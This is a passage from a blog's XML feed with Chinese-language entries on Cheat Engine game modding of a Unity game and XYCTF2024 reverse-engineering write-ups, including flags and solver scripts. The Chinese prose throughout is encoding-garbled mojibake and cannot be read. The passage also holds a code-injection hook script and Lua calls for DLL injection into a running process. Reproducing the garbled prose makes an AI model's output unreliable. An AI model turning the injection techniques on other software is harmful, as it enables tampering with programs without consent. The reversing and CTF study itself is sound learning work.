alt="image-20240501235648619"></p><p>åšå‡ºæŒ‡é’ˆï¼Œåé¢çš„soulåŒç†ï¼Œä¸å†èµ˜è¿°</p><p>åœ¨è¿™ä¸ªç»“æ„ä½“ä¸­è¿˜æœ‰äººç‰©è¡€é‡ï¼š</p><p>åŒç†æŠŠæ‰¾åˆ°çš„ç»“æ„ä½“å¼€å¤´ä½œä¸ºåŸºå€æ¥åç§»å°±å¥½</p><p><img src="https://s2.loli.net/2024/05/01/SOsnpq3f876uJy9.png" alt="image-20240501235927670"></p><p>æœ€åè¿˜æœ‰costï¼Œæ¯å›åˆè´¹ç”¨ï¼Œå®ƒä¸åœ¨è¿™ä¸ªç»“æ„ä½“é‡Œé¢ï¼Œé‡æ–°æœç´¢ï¼Œå¦‚æ³•ç‚®åˆ¶ï¼š</p><p>å…ˆçœ‹ç»“æ„ä½“åç§»8c</p><p>æ‰¾åˆ°setAPå‡½æ•°å’ŒgetAPå‡½æ•°ï¼Œè¿™ä¸¤ä¸ªå‡½æ•°ä¼¼ä¹éƒ½æ²¡æœ‰ç¡¬ç¼–ç çš„åœ°å€ï¼Œä¹Ÿæ¯”è¾ƒåˆç†ï¼Œæ¯æ¬¡å¼€ä¸€ä¸ªæˆ˜æ–—éƒ½è¦é‡æ–°ç”Ÿæˆä¸€æ¬¡ï¼Œä½†æ˜¯å¯ä»¥çœ‹åˆ°ï¼š</p><p><img src="https://s2.loli.net/2024/05/02/GAPbXhqDOozjyxf.png" alt="image-20240502000544674"></p><p>æ˜æ˜¾ç»“æ„ä½“å¼€å¤´åœ¨r15ï¼Œä½†æ˜¯æ‹¿ä¸åˆ°å€¼ï¼Œå¹²è„†ç›´æ¥æ³¨å…¥ä»£ç ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">[Enable]</span><br><span class="line">&#123;$asm&#125;</span><br><span class="line">alloc(newmem,512,BattleTeam:SetAP+11d)</span><br><span class="line">label(returnhere)</span><br><span class="line">label(originalcode)</span><br><span class="line">label(exit)</span><br><span class="line">alloc(Battledata,8)</span><br><span class="line">registersymbol(Battledata);åˆ›å»ºå…¨å±€å˜é‡</span><br><span class="line">newmem:;æ’å…¥è·å–çš„ä»£ç </span><br><span class="line">mov [Battledata],r15</span><br><span class="line">originalcode:;åŸæ¥çš„ä»£ç </span><br><span class="line">mov [r15+0000008C],edi</span><br><span class="line"></span><br><span class="line">exit:</span><br><span class="line">jmp returnhere</span><br><span class="line"></span><br><span class="line">BattleTeam:SetAP+11d:;æŠŠç›®æ ‡åœ°å€æ”¹æˆè·³è½¬</span><br><span class="line">jmp newmem</span><br><span class="line">nop 2</span><br><span class="line">returnhere:</span><br><span class="line"></span><br><span class="line">[Disable]</span><br><span class="line">BattleTeam:SetAP+11d:;è¿˜åŸä»£ç </span><br><span class="line">mov [r15+0000008C],edi</span><br><span class="line">dealloc(Battledata)</span><br><span class="line">dealloc(newmem)</span><br><span class="line"></span><br><span class="line">&#123;$asm&#125;</span><br></pre></td></tr></table></figure><p>è¿™æ ·å°±æ‹¿åˆ°ç»“æ„ä½“å¤´äº†ï¼Œä¸è¿‡å› ä¸ºæ˜¯ä»£ç æ³¨å…¥ï¼Œå¿…é¡»è¦è°ƒç”¨ä¸€æ¬¡è¿™ä¸ªå‡½æ•°ä¹‹åæ‰å¯ä»¥å¾—åˆ°å€¼ã€‚</p><p>åŒç†å°±å¾—åˆ°APçš„å€¼äº†ã€‚</p><hr><h2 id="é”è¡€å’Œç§’æ€">é”è¡€å’Œç§’æ€</h2><hr><h2 id="è§’è‰²ä¿¡ç‰©">è§’è‰²ä¿¡ç‰©</h2><p>è¿™ä¸ªæ¸¸æˆæœ‰ä¸€ä¸ªè®¾å®šï¼Œè§£é”è§’è‰²éœ€è¦ä¸€äº›æ¡ä»¶ã€‚ç„¶åå¦‚æœæƒ³è¦çœ‹åæ—¥è°ˆï¼Œéœ€è¦è§£é”æ‰€æœ‰è§’è‰²ï¼Œç„¶åç”¨å¯¹åº”çš„ç¤¼ç‰©ç»™å¯¹åº”çš„è§’è‰²3æ¬¡ï¼Œå¹¶åœ¨æœ€åæ‰“æœ€ç»ˆbossçš„æ—¶å€™å¸¦ä¸Šä»–ä»¬å¹¶é€šå…³ï¼Œè¿™éœ€è¦èŠ±è´¹çš„æ—¶é—´å¤ªé•¿äº†ï¼Œå¾ˆç¦»è°±ï¼Œæ‰€ä»¥å‡†å¤‡ä¿®æ”¹ä¸€ä¸‹ã€‚</p><p>åœ¨dnspyä¸­æœç´¢è§’è‰²æ•°æ®ï¼Œä»»æ„æœç´¢ä¸€ä¸‹ï¼Œæ‰¾åˆ°äº†ä¸€ä¸ªç”¨äºè¿”å›è¿™ä¸€ä¸ªè§’è‰²æ•°æ®çš„å‡½æ•°ï¼š</p><p><img src="https://s2.loli.net/2024/05/06/sMQwtbKVmOk93EP.png" alt="image-20240506212320587"></p><p>é€šè¿‡è¿™ä¸ªæŸ¥æ‰¾è¢«ä»€ä¹ˆä½¿ç”¨</p><p>æ‰¾åˆ°ç»™ç¤¼ç‰©çš„å‡½æ•°ï¼š</p><p><img src="https://s2.loli.net/2024/05/06/AkKPJTcZufQoRle.png" alt="image-20240506212840126"></p><p>è¿™ä¸ªå‡½æ•°è¡¨æ˜å¯ä»¥é€šè¿‡charidæ¥æŸ¥æ‰¾å¯¹åº”çš„charData</p><h2 id="CEå…¶å®ƒå¸¸è§æ“ä½œ">CEå…¶å®ƒå¸¸è§æ“ä½œ</h2><p>luaå‡½æ•°ï¼š</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">injectDll(<span class="string">&quot;dllpath&quot;</span>)<span class="comment">--ç›´æ¥æ³¨å…¥dll</span></span><br><span class="line">executeCode(addr)<span class="comment">--æ‰§è¡Œè¿‡ç¨‹</span></span><br><span class="line">executeCodeEx(addr,param1,param2,...)<span class="comment">--å¸¦å‚æ‰§è¡Œ</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> çŸ¥è¯†é›† </category>
          
          <category> å®è·µ </category>
          
          <category> é€†å‘ </category>
          
          <category> é€†å‘ </category>
          
          <category> å·¥å…· </category>
          
          <category> CE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RE </tag>
            
            <tag> æ¸¸æˆé€†å‘ </tag>
            
            <tag> unity </tag>
            
            <tag> CE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NSSCTF-r22é¢˜ç›®å¤ç°</title>
      <link href="/posts/8a68bf71.html"/>
      <url>/posts/8a68bf71.html</url>
      
        <content type="html"><![CDATA[<p>2024/11/16ï¼šæ²¡å†™ï¼Œç®—äº†</p>]]></content>
      
      
      <categories>
          
          <category> é¢˜é›† </category>
          
          <category> CTF </category>
          
          <category> æ¯”èµ› </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>XYCTF2024-wp</title>
      <link href="/posts/685012f7.html"/>
      <url>/posts/685012f7.html</url>
      
        <content type="html"><![CDATA[<p>èƒ½è¯´ä»€ä¹ˆå‘¢ï¼Œè¿™é¢˜ã€‚ã€‚ã€‚éš¾ä»¥è¨€å–»</p><hr><h2 id="RE">RE</h2><h3 id="week1">week1</h3><h4 id="DebugMe">DebugMe</h4><p>è¿™ä¸ªæ˜¯å®‰å“åŠ¨æ€è°ƒè¯•ï¼Œä¹‹å‰é‡åˆ°è¿‡ä¸€ä¸ªç±»ä¼¼çš„ï¼Œä½†æ˜¯ä¸åŒçš„æ˜¯ï¼Œé‚£ä¸ªç›´æ¥åœ¨æ¨¡æ‹Ÿå™¨é‡Œé¢è°ƒå°±å¯ä»¥ï¼Œè¿™æ¬¡è¿™ä¸ªå¥½åƒæ²¡æœ‰è¢«jadxè¯†åˆ«åˆ°ã€‚</p><p>ç„¶åå­¦åˆ°äº†å¦å¤–ä¸€ç§æ–¹æ³•ï¼š</p><p>åœ¨jadxè°ƒè¯•ç•Œé¢ç›´æ¥ç‚¹å‡»å¯åŠ¨ADBæœåŠ¡ï¼Œç„¶åæ‰“å¼€æ¨¡æ‹Ÿå™¨ï¼Œç‚¹å‡»åˆ·æ–°ï¼Œå°±èƒ½çœ‹åˆ°æ‰€æœ‰è¿›ç¨‹ï¼Œç„¶åå°±å¯ä»¥è°ƒè¯•äº†</p><p>è¿™ä¸ªæ—¶å€™ç‚¹å‡»æŒ‰é’®ï¼Œå‡ºflag</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">XYCTF</span><span class="template-variable">&#123;d3bugg3r_15_v3ry_u53ful&#125;</span></span><br></pre></td></tr></table></figure><h4 id="ä½ çœŸçš„æ˜¯å¤§å­¦ç”Ÿå—ï¼Ÿ">ä½ çœŸçš„æ˜¯å¤§å­¦ç”Ÿå—ï¼Ÿ</h4><p>è¿™ä¸ªæ˜¯ä¸€ä¸ª16ä½dosç¨‹åºï¼Œidaæ‰“å¼€çœ‹æ±‡ç¼–è¿˜åŸç¨‹åº</p><p>åŠ å¯†é€»è¾‘ï¼š</p><p><img src="https://s2.loli.net/2024/04/06/OKsLR8WFtHxiI92.png" alt="image-20240406123918332"></p><p>ç›¸å½“äºæ¯æ¬¡å’Œä¸‹ä¸€ä½xor</p><p>ä¹‹å‰æ²¡æ€ä¹ˆææ‡‚mov si ï¼Œ2Fï¼Œç„¶åå‘ç°æ˜¯æŠŠå®ƒå½“åœ°å€ã€‚ã€‚æ²¡çœ‹æ˜ç™½add si,cxæœ‰ä»€ä¹ˆç”¨ï¼Œå¯èƒ½add si,cxæ˜¯åˆ›å»ºä¸€ä¸ªç©ºç¼“å†²åŒºå­˜è¾“å…¥çš„ã€‚</p><p>åŠ å¯†é€»è¾‘ç¡®å®æ˜¯ä»æœ€åå¼€å§‹å‘å‰å¼‚æˆ–ï¼Œ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a = *p2;</span><br><span class="line">p2-=<span class="number">1</span>;</span><br><span class="line">*p2 ^= a;</span><br></pre></td></tr></table></figure><p>é‚£ç›´æ¥é€†å‘</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> prism <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">a = [<span class="number">0x76</span>, <span class="number">0x0E</span>, <span class="number">0x77</span>, <span class="number">0x14</span>, <span class="number">0x60</span>, <span class="number">0x06</span>, <span class="number">0x7D</span>, <span class="number">0x04</span>, <span class="number">0x6B</span>, <span class="number">0x1E</span>, <span class="number">0x41</span>, <span class="number">0x2A</span>, <span class="number">0x44</span>, <span class="number">0x2B</span>, <span class="number">0x5C</span>, <span class="number">0x03</span>, <span class="number">0x3B</span>, <span class="number">0x0B</span>, <span class="number">0x33</span>, <span class="number">0x05</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line">    a[i]^=a[(i+<span class="number">1</span>)%<span class="built_in">len</span>(a)]</span><br><span class="line">pl(a)</span><br><span class="line"><span class="comment"># xyctf&#123;you_know_8086&#125;</span></span><br></pre></td></tr></table></figure><h4 id="å–µå–µçš„flagç¢äº†ä¸€åœ°">å–µå–µçš„flagç¢äº†ä¸€åœ°</h4><p>è¿™ä¸ªä¸ç”¨å¤šè¯´ï¼Œç›´æ¥è·Ÿç€æç¤ºèµ°å°±å¥½</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;<span class="symbol">My_fl@</span><span class="symbol">g_h4s_br0ken_4parT_Bu7_Y0u_c@</span>n_f1x_1t!&#125;</span><br></pre></td></tr></table></figure><h4 id="èªæ˜çš„ä¿¡ä½¿">èªæ˜çš„ä¿¡ä½¿</h4><p>ä¸€çœ¼å‡¯æ’’åŠ å¯†ï¼Œæ‹¿å»çˆ†ç ´</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Y0u_KnOw_Crypt0_14_v3ry_Imp0rt@nt!&#125;</span><br></pre></td></tr></table></figure><p>åç§»æ˜¯9</p><h4 id="Trustme">Trustme</h4><p>è§£åŒ…ä¹‹åæ„Ÿè§‰å“ªé‡Œä¸å¯¹ï¼Œå¥½åƒä»€ä¹ˆéƒ½æ²¡æœ‰ï¼Œä½†æ˜¯assetsé‡Œé¢æœ‰ä¸€ä¸ªmydbçš„æ–‡ä»¶ï¼Œæ‰“å¼€çœ‹çœ‹ï¼Œå…¨æ˜¯0xffï¼Œå¼‚æˆ–ä¸€ä¸‹è¯•è¯•ï¼Œå‡ºæ¥äº†QAQ</p><p>æŸ¥ä¸€ä¸‹çŸ¥é“è¿™ä¸ªæ˜¯SQLiteæ–‡ä»¶ï¼Œç”¨åœ¨çº¿å·¥å…·åˆ†ææ–‡ä»¶å¾—åˆ°flag</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">XYCTF</span><span class="template-variable">&#123;And0r1d_15_V3ryEasy&#125;</span></span><br></pre></td></tr></table></figure><h4 id="Baby-Unity-ez-Unity">Baby Unity / ez Unity</h4><p>è¿™ä¸¤ä¸ªçš„åšæ³•ä¸€æ¨¡ä¸€æ ·ï¼Œå”¯ä¸€çš„åŒºåˆ«æ˜¯ezé‡Œé¢çš„datæ–‡ä»¶å¤´è¢«ä¿®æ”¹äº†ï¼Œå…ˆæ”¾flagï¼Œç„¶åè®°å½•ä¸€ä¸‹ç¬¬ä¸€æ¬¡é‡åˆ°li2cppçš„é¢˜</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">XYCTF</span>&#123;<span class="number">389</span>f6900-e12d-<span class="number">4</span>c54-a85d-<span class="number">64</span>a54af9f84c&#125;</span><br></pre></td></tr></table></figure><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">XYCTF</span><span class="template-variable">&#123;IL2CPP_1s_intere5t1ng&#125;</span></span><br></pre></td></tr></table></figure><p>åŸç†å¤§æ¦‚æ˜¯è¿™æ ·ï¼š</p><p>unityçš„æ¸¸æˆè¾“å‡ºæœ‰ä¸¤ç§ä¸€ç§æ˜¯monoçš„c#ï¼ˆä¸€èˆ¬é€†çš„ï¼‰ï¼Œè¿™ç§ä¸€èˆ¬åœ¨managedæ–‡ä»¶å¤¹é‡Œæœ‰Assembly-CShap.dllæ–‡ä»¶ï¼Œç„¶åè¿™ä¸ªä¸œè¥¿å¯ä»¥ç›´æ¥è¢«dnspyä¹‹ç±»çš„ç›´æ¥åç¼–è¯‘ã€‚è¿™æ¬¡è¿™ç§å«li2cppï¼ˆä¸­é—´ä»£ç  to cppï¼‰,é€šè¿‡å¤±å»åŠ¨æ€ç¼–è¯‘ç‰¹æ€§æ¥æ¢å–cppçš„å¤šå¹³å°ï¼Œé€Ÿåº¦å¿«ç­‰ä¼˜åŠ¿ï¼Œå¯¹é€†å‘æ¥è¯´ï¼šæœ€æ¶å¿ƒçš„å°±æ˜¯æ–‡ä»¶å˜æˆäº†GameAssembly.dllï¼Œè¿™æ˜¯ä¸ªPEæ–‡ä»¶ï¼ˆåœ¨ç§»åŠ¨ç«¯æ˜¯soæ–‡ä»¶ï¼‰ï¼Œä¹Ÿå°±æ˜¯è¯´ç¬¦å·è¡¨å®Œå…¨ä¸å¿…è¦æœ‰ï¼Œè¿™æ ·å°±ä¸å¥½é€†äº†ï¼ˆå¦‚æœæœ‰ä½¬å¯ä»¥ç›´æ¥é€†çš„è¯ï¼Œåªèƒ½è¯´NBï¼‰ï¼Œä¸è¿‡è¿™ä¸ªæ–‡ä»¶ä¹Ÿæ²¡æœ‰å¸¸é‡è¡¨ä¹‹ç±»çš„ä¸œè¥¿æ‰€ä»¥è‚¯å®šåœ¨ä¸€ä¸ªåœ°æ–¹å­˜äº†å®ƒçš„æ•°æ®æ¥è¯»å…¥ã€‚</p><p>æ ¹æ®æ£€ç´¢ç½‘ç»œå¾—çŸ¥ï¼šç¬¦å·è¡¨ä½äº\il2cpp_data\Metadata\global-metadata.dat</p><p>ç°åœ¨çš„ç›®çš„å°±æ˜¯æŠŠè¿™ä¸ªæ–‡ä»¶å¯¼å…¥è¿›å»äº†ã€‚</p><p>æœ‰ä¸€ä¸ªå·¥å…·å«åšlicppdumperå¯ä»¥åšåˆ°è¿™ä¸€ç‚¹ï¼š</p><p>ä¸‹è½½ååŒå‡»exeï¼Œæç¤ºé€‰æ‹©li2cppäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œé€‰æ‹©GameAssembly.dllï¼Œåˆæç¤ºé€‰æ‹©datæ–‡ä»¶é€‰æ‹©datæ–‡ä»¶ï¼ˆbabyé‚£é“é¢˜å¯ä»¥ç›´æ¥å¯¼å…¥ï¼Œezé‚£é“é¢˜åšäº†åŠ å¯†ï¼‰</p><p>å‘ç°å¯¼å…¥ä¸äº†ï¼Œå»010çœ‹çœ‹ç»“æ„ï¼š</p><p><img src="https://s2.loli.net/2024/04/06/cElIVup7XRNadnD.png" alt="é”™è¯¯çš„ç»“æ„"></p><p><img src="https://s2.loli.net/2024/04/06/DjiS8cWGAzyf3U5.png" alt="æ­£å¸¸çš„ç»“æ„"></p><p>æŠŠç¬¬ä¸€æ’æ”¹æˆAF 1B B1 FA 1D 00 00 00 00 01 00 00ï¼Œåˆ å‡ ä¸ªå­—ç¬¦ï¼Œè®©åé¢æ¥ç€C0 B2</p><p>ç„¶åæŠŠä¸‹é¢çš„å†…å®¹å¯¹é½</p><p>ç›´æ¥dumperå¯¼å…¥ï¼Œå¯¼å…¥æˆåŠŸï¼</p><p>ç„¶åæ‰“å¼€idaï¼Œå¯¼å…¥è„šæœ¬æ–‡ä»¶ï¼Œç„¶åé€‰æ‹©åˆšåˆšç”¨dumperç”Ÿæˆçš„ä¸¤ä¸ªjsonæ–‡ä»¶ï¼š</p><p>script.jsonå’Œstringliteral.jsonæ–‡ä»¶ï¼Œä¸¤ä¸ªé€‰æ‹©å®Œä¹‹å,ç¬¦å·è¡¨å°±æ¢å¤äº†ï¼Œç„¶ååœ¨idaé‡Œé¢ç›´æ¥æ‰¾åŠ å¯†å‡½æ•°ï¼Œåº”è¯¥å¾ˆå¥½çœ‹ï¼Œä¸€ä¸ªæ˜¯RC4ï¼Œä¸€ä¸ªæ˜¯AESç›´æ¥æ”¾åˆ°åœ¨çº¿ç½‘ç«™ä¸Šè§£å°±å¥½äº†ï¼Œå…¶ä¸­ç”¨åˆ°çš„æ•°è¢«è¿˜åŸæˆæ³¨é‡Šäº†ï¼Œä¸è¦çœ‹é”™äº†QAQ</p><h3 id="week2">week2</h3><h4 id="ez-cube">ez_cube</h4><p>ç”¨idaåç¼–è¯‘åˆ†æï¼Œæ‰¾åˆ°æ‰“ä¹±æ–¹å¼</p><p><img src="https://s2.loli.net/2024/04/09/21wu6gCdpSfPxc5.png" alt="image-20240409183514183"></p><p>ç™¾åº¦æœç´¢cfop pllå¯å¾—å…¬å¼</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">R <span class="string">U&#x27; R U R U R U&#x27;</span> <span class="string">R&#x27; U&#x27;</span> R2</span><br><span class="line">flag&#123;RuRURURuruRR&#125;</span><br></pre></td></tr></table></figure><h4 id="ez-rand">ez_rand</h4><p>è¿™ä¸ªé¢˜å°±æ˜¯è€ƒrandå‡½æ•°åœ¨ä¸åŒç¯å¢ƒä¸‹æ•ˆæœä¸åŒè¿™ä¸ªçŸ¥è¯†ç‚¹ï¼Œåˆšå¥½æˆ‘ä¸€å¼€å§‹å°±ç”¨çš„cppï¼Œç›´æ¥å†™è„šæœ¬çˆ†ç ´å‡ºrandç„¶åç”¨å°±å¥½äº†ï¼Œè¿˜æœ‰æ³¨æ„ä¼ å…¥åˆå§‹åŒ–çš„å€¼åœ¨alå¯„å­˜å™¨é‡Œé¢ï¼Œæ‰€ä»¥è¦&amp;0xffff</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;ctime&gt;</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstdlib&gt;</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="type">long</span> tstart = <span class="number">1640966400</span>;</span><br><span class="line">    <span class="type">long</span> tlast = <span class="number">1735660800</span>;</span><br><span class="line">    <span class="type">long</span> time = <span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> flag[<span class="number">29</span>] = &#123; <span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span> &#125;;<span class="comment">/*&quot;XYCTF&#123;&quot;;*/</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> data[<span class="number">29</span>] = &#123;</span><br><span class="line">    <span class="number">0x5D</span>, <span class="number">0x0C</span>, <span class="number">0x6C</span>, <span class="number">0xEA</span>, <span class="number">0x46</span>, <span class="number">0x19</span>, <span class="number">0xFC</span>, <span class="number">0x34</span>, <span class="number">0xB2</span>, <span class="number">0x62</span>, <span class="number">0x23</span>, <span class="number">0x07</span>, <span class="number">0x62</span>, <span class="number">0x22</span>, <span class="number">0x6E</span>, <span class="number">0xFB</span>,</span><br><span class="line">    <span class="number">0xB4</span>, <span class="number">0xE8</span>, <span class="number">0xF2</span>, <span class="number">0xA9</span>, <span class="number">0x91</span>, <span class="number">0x12</span>, <span class="number">0x21</span>, <span class="number">0x86</span>, <span class="number">0xDB</span>, <span class="number">0x8E</span>, <span class="number">0xE9</span>, <span class="number">0x43</span>, <span class="number">0x4D</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="comment">//for (time = tstart; time &lt;= tlast; time++)</span></span><br><span class="line">    <span class="comment">//&#123;</span></span><br><span class="line">    <span class="comment">//    srand(time &amp; 0xffff);</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//    int f = 0;</span></span><br><span class="line">    <span class="comment">//    for (int i = 0; i &lt; 6; i++)</span></span><br><span class="line">    <span class="comment">//    &#123;</span></span><br><span class="line">    <span class="comment">//        int num = rand();</span></span><br><span class="line">    <span class="comment">//        if ((flag[i] ^ (unsigned __int8)(num + ((((unsigned __int64)(2155905153 * num) &gt;&gt; 32) &amp; 0x80000000) != 0) + ((int)((unsigned __int64)(2155905153 * num) &gt;&gt; 32) &gt;&gt; 7))) == data[i])</span></span><br><span class="line">    <span class="comment">//        &#123;</span></span><br><span class="line">    <span class="comment">//            f++;</span></span><br><span class="line">    <span class="comment">//        &#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//        if (f &gt;= 6)</span></span><br><span class="line">    <span class="comment">//        &#123;</span></span><br><span class="line">    <span class="comment">//            printf(&quot;%d  &quot;, time &amp; 0xffff);</span></span><br><span class="line">    <span class="comment">//        &#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//    &#125;</span></span><br><span class="line">    <span class="comment">//    //std::cout &lt;&lt; std::endl;</span></span><br><span class="line">    <span class="comment">//&#125;</span></span><br><span class="line">    time = <span class="number">21308</span>;</span><br><span class="line">    <span class="built_in">srand</span>(time);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">29</span>; i++) &#123;</span><br><span class="line">        <span class="type">int</span> num = <span class="built_in">rand</span>();</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> x = (<span class="type">unsigned</span> __int8)(num + ((((<span class="type">unsigned</span> __int64)(<span class="number">2155905153</span> * num) &gt;&gt; <span class="number">32</span>) &amp; <span class="number">0x80000000</span>) != <span class="number">0</span>) + ((<span class="type">int</span>)((<span class="type">unsigned</span> __int64)(<span class="number">2155905153</span> * num) &gt;&gt; <span class="number">32</span>) &gt;&gt; <span class="number">7</span>));</span><br><span class="line">        flag[i] = data[i] ^ x;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    std::cout &lt;&lt; flag;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//XYCTF&#123;R@nd_1s_S0_S0_S0_easy!&#125;</span></span><br></pre></td></tr></table></figure><h4 id="ä»Šå¤•æ˜¯ä½•å¹´">ä»Šå¤•æ˜¯ä½•å¹´</h4><p>æ¶æ„é¢˜ï¼Œæ˜¯é¾™èŠ¯æ¶æ„ï¼Œé…å¥½è™šæ‹Ÿæœºï¼Œç„¶åç›´æ¥è¾“å‡º</p><p><img src="https://s2.loli.net/2024/04/09/dmL7viqNCcRYBZI.png" alt="image-20240409185205541"></p><h4 id="ä½•é¡»ç›¸æ€ç…®ä½™å¹´">ä½•é¡»ç›¸æ€ç…®ä½™å¹´</h4><p>å±…ç„¶æ˜¯ä¸€ä¸ªtxtæ–‡ä»¶ï¼Œå¼€å¤´æ˜¯push ebpï¼Œé‚£æ²¡äº‹äº†ï¼Œç›´æ¥ida32æ‰“å¼€</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> prism <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">enc = [<span class="number">88</span>,<span class="number">88</span>,<span class="number">134</span>,<span class="number">87</span>,<span class="number">74</span>,<span class="number">118</span>,<span class="number">318</span>,<span class="number">101</span>,<span class="number">59</span>,<span class="number">92</span>,<span class="number">480</span>,<span class="number">60</span>,<span class="number">65</span>,<span class="number">41</span>,<span class="number">770</span>,<span class="number">110</span>,<span class="number">73</span>,<span class="number">31</span>,<span class="number">918</span>,<span class="number">39</span>,<span class="number">120</span>,<span class="number">27</span>,<span class="number">1188</span>,<span class="number">47</span>,<span class="number">77</span>,<span class="number">24</span>,<span class="number">1352</span>,<span class="number">44</span>,<span class="number">81</span>,<span class="number">23</span>,<span class="number">1680</span>,<span class="number">46</span>,<span class="number">85</span>,<span class="number">15</span>,<span class="number">1870</span>,<span class="number">66</span>,<span class="number">91</span>,<span class="number">16</span>,<span class="number">4750</span>]</span><br><span class="line"></span><br><span 